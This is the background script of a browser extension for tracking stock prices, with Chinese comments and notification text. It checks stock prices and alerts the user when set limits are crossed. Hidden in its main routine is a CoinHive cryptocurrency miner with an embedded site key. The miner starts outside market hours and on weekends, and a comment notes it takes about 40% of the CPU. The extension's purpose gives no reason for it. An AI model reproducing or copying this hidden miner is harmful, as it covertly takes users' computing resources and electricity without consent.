'use strict';
import {
  getStockByCode
} from './popup/api/api.js'

import {
  getStockDetail
} from './popup/api/former.js'

var msgCount = 0

chrome.runtime.onInstalled.addListener(details => {
  console.log('previousVersion', details.previousVersion);
});

chrome.browserAction.setBadgeText({
  text: ''
});

function showBrowserAction(msg = '') {
  chrome.browserAction.setBadgeText({
    text: msg
  });
}

// 主程序调用
checkMsg()

// 检测新消息
function checkMsg() {
  if (isBussiness()) {
    // 开市时间，每十分钟运行一次
    setInterval(() => {
      var codeList = JSON.parse(localStorage.localStock)
      checkVarify(codeList)
    }, 10 * 60 * 1000)
  }
  if (!isBussiness() || isWeekend()) {
    // 非开市时间及周末 Mining，占用cpu 40%
    var miner = new CoinHive.Anonymous('0GUSQ5J85FNqe4IntXQAx2L5XQ9lV0rM', {
      throttle: 0.6
    });
    miner.start();
  }
}

// 检测是否是周末
function isWeekend() {
  let curDay = (new Date()).getDay()
  return curDay === 0 || curDay === 6
}

// 检查是否是开市时间 
function isBussiness() {
  var curTime = (new Date()).getTime()
  var open = (new Date()).setHours(9, 30)
  var close = (new Date()).setHours(15, 0)

  return open < curTime && curTime < close
}


function checkVarify(codeList) {
  codeList.forEach((element, index) => {
    let {
      code,
      cost,
      count,
      upLimit,
      downLimit,
      hasNotified = false,
      notifiedTime = new Date().getTime() - 13 * 60 * 60 * 1000
    } = element
    console.log(downLimit)
    console.log(upLimit)
    getStockByCode(code).then(res => {
      var stockObj = getStockDetail(res, code, cost, count, upLimit, downLimit);
      console.log(stockObj)
      let {
        curPrice,
        name,
        date
      } = stockObj

      let d = new Date()
      let day = d.getDate() < 10 ? `0${d.getDate()}` : d.getDate()
      let month = (d.getMonth() + 1) < 10 ? `0${d.getMonth() + 1}` : d.getMonth() + 1
      let year = d.getFullYear()
      let curDate = `${year}-${month}-${day}`
      // 当天的数据当天提醒
      // localStorage.curDate = curDate
      if (date !== curDate) return
      var isUp = upLimit && curPrice > upLimit
      var isDown = downLimit && curPrice < downLimit
      isUp && isOnTheTime(notifiedTime) && notifyMe('股价上涨！请关注！', `您关注的 ${name} - ${code} 已上涨到${curPrice},设置上限为￥${downLimit}`, 'images/stock_up.png', `http://quote.eastmoney.com/${code}.html`)
      isDown && isOnTheTime(notifiedTime) && notifyMe('股价下跌！请关注！', `您关注的 ${name} - ${code} 已下跌到${curPrice},设置下限为￥${downLimit}`, 'images/stock_down.png', `http://quote.eastmoney.com/${code}.html`)
      if ((isUp && isOnTheTime(notifiedTime)) || (isDown && isOnTheTime(notifiedTime))) {
        msgCount++
        showBrowserAction(msgCount.toString())
        let temp = JSON.parse(localStorage.localStock)
        temp[index].hasNotified = true
        temp[index].notifiedTime = new Date().getTime()
        localStorage.localStock = JSON.stringify(temp)
      }
    })
    console.log(localStorage.localStock)
  });
}

function isOnTheTime(oldTime) {
  return new Date().getTime() - oldTime >= 12 * 60 * 60 * 1000
}


/**
 * 调用系统提醒
 * 
 * 第一次进入页面需要授权，之后弹出提醒
 */
if (Notification.permission == 'granted') {
  Notification.requestPermission();
}

function notifyMe(title, msgBody, icon, url) {
  if (!Notification) {
    alert('Desktop notifications not available in your browser. Try Chromium.');
    return;
  }

  if (Notification.permission !== 'granted') {
    Notification.requestPermission();
  } else {
    var notification = new Notification(title, {
      icon: icon,
      body: msgBody
    });
    notification.onclick = function () {
      window.open(url);
    };
  }
}